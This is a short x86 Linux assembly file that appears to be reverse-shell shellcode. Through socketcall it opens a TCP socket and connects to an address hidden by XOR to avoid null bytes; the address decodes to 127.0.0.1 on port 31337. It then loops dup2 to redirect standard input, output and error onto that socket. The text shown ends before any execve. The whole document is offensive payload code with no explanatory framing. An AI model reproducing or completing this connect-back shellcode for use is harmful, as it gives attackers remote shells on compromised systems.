.global main
main:
	push	$0x66
	pop		%eax

	push	$0x1
	pop		%ebx

	xor		%edx, %edx
	push	%edx
	push	%ebx
	push	$0x2
	mov		%esp, %ecx

	int		$0x80
	xchg	%eax, %edx



	mov		$0x66, %al

	mov 	$0x0101017f, %ecx
	xor		$0x1010107f, %ecx
	xor		$0x1011117f, %ecx
	push	%ecx

	pushw	$0x697a
	inc		%ebx
	pushw	$0x2
	mov		%esp, %ecx

	push	$0x10
	push	%ecx
	push	%edx

	mov		%esp, %ecx
	inc		%ebx

	int		$0x80



	push	$0x2
	pop		%ecx
	xchg	%ebx, %edx
loop:
	mov		$0x3f, %al
	int		$0x80
	dec		%ecx
	jns		loop
